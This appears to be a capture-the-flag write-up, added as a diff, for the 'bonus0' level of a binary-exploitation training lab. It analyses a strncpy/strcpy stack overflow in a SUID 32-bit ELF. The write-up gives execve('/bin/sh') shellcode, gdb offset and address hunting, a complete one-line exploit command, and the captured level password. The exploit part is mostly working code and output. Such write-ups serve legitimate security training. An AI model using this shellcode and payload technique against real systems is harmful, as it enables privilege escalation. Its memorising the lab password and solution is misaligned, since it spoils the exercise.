@@ -1,0 +1,139 @@
+# Bonus 0
+
+Binary: 32-bit ELF, SUID bonus1, dynamically linked. NX disabled.
+
+## Analysis
+
+### Ghidra output
+
+```c
+void p(char *dest, char *prompt) {
+    char buffer[4096];
+    puts(prompt);
+    read(0, buffer, 0x1000);
+    *strchr(buffer, '\n') = '\0';
+    strncpy(dest, buffer, 20);        // NO null terminator if input is 20+ bytes
+}
+
+void pp(char *out) {
+    char a[20];
+    char b[20];
+    p(a, " - ");                       // read input 1
+    p(b, " - ");                       // read input 2
+    strcpy(out, a);
+    out[strlen(out)] = ' ';
+    strcat(out, b);
+}
+
+int main(void) {
+    char buf[42];
+    pp(buf);
+    puts(buf);
+    return 0;
+}
+```
+
+Two nested bugs:
+
+1. `strncpy(dest, buffer, 20)` does not null-terminate if the input is 20 bytes or more. So `a` (or `b`) can end up without a null.
+2. `strcpy(out, a)` + later `strcat(out, b)` can overflow `main`'s 42-byte `buf` if `a` is missing its null terminator.
+
+## Overflow mechanics
+
+With first input = 20 bytes (no null in `a`):
+- `strcpy(out, a)` reads past `a` into `b` (adjacent on pp's stack) until it finds a null.
+- If `b` also lacks null (20-byte second input), strcpy continues into pp's saved registers, main's `buf` grows way past 42 bytes.
+
+### Offset to EIP
+
+Using a cyclic pattern as the second input while first input is 20 chars:
+
+```
+(gdb) run
+ -
+01234567890123456789
+ -
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+```
+
+EIP = `0x41336141` = `"Aa3A"`. Looking at the pattern, this substring starts at **offset 9** of the second input.
+
+So second input layout: 9 bytes of padding + 4 bytes return address + more padding.
+
+## The shellcode survives
+
+Key insight: the shellcode does NOT live in `a` or `b` (only 20 bytes each). Instead, it lives in `p()`'s own 4096-byte `buffer`.
+
+- First p() call: read() fills buffer with NOPs + shellcode (up to 4096 bytes).
+- strncpy copies first 20 bytes into `a`, but the full content stays in p's stack frame.
+- Second p() call: read() overwrites only the first 20 bytes of buffer. Positions 20 to 4095 keep the first call's content, because p's buffer is at the same stack location across calls.
+
+So the NOP sled + shellcode from the first input survives, sitting on the stack at a predictable address.
+
+## Build the exploit
+
+### Shellcode (28 bytes)
+
+From Phrack / Aleph One lineage, execve("/bin/sh") with edx explicitly zeroed. Same family as level2/level9 but uses `mov ecx, eax; mov edx, eax` (shorter than lea-based zeroing):
+
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+```
+
+Breakdown:
+- `\x31\xc0`: xor eax, eax
+- `\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3`: build "/bin//sh" on stack, ebx points to it
+- `\x89\xc1\x89\xc2`: ecx = 0, edx = 0 (both copy from eax which is 0)
+- `\xb0\x0b\xcd\x80`: syscall execve
+- `\x31\xc0\x40\xcd\x80`: if execve fails, exit(1)
+
+### Find p's buffer address
+
+```
+gdb ./bonus0
+(gdb) set disassembly-flavor intel
+(gdb) b *p+28
+(gdb) run
+<enter something when prompted>
+(gdb) x $ebp-0x1008
+0xbfffeb20:     0x00000000
+```
+
+So buffer starts around `0xbfffeb20`. Target somewhere in the NOP sled: `0xbfffeb20 + 60 = 0xbfffeb5c` (little-endian `\x5c\xeb\xff\xbf`).
+
+Runtime address shifts from GDB's a bit (GDB adds its own env vars), but 100+ NOPs give enough slop.
+
+### Final payload
+
+- First input: 100 NOPs + 28-byte shellcode = 128 bytes (fits in p's 4096 buffer).
+- Second input: 9 bytes padding + 4 bytes return address + 7 bytes filler = 20 bytes.
+
+```bash
+(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*9 + "\x5c\xeb\xff\xbf" + "B"*7'; cat) | ./bonus0
+```
+
+Then (blindly, no shell prompt):
+
+```
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+
+Flag: `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
+
+## Notes
+
+### If the address is wrong
+
+Address from GDB and runtime can differ by 16 to 200 bytes because of env var differences. If the exploit segfaults, shift the target address by 16-32 bytes in either direction and retry. The 100-byte NOP sled gives enough tolerance.
+
+### Why does the shellcode persist across the two p() calls?
+
+p()'s local buffer is at a fixed offset from p's frame pointer. Both calls to p() have the same stack depth (pp's state didn't change between them), so both calls place buffer at the same address. The second call only writes 20 bytes (our second input), leaving bytes 20 to 4095 of the buffer untouched, so the first call's NOPs and shellcode stay there.
+
+### Credit
+
+Exploit structure adapted from the public solution at https://github.com/maxisimo/42-RainFall/tree/main/bonus0, which references the shellcode from shell-storm.
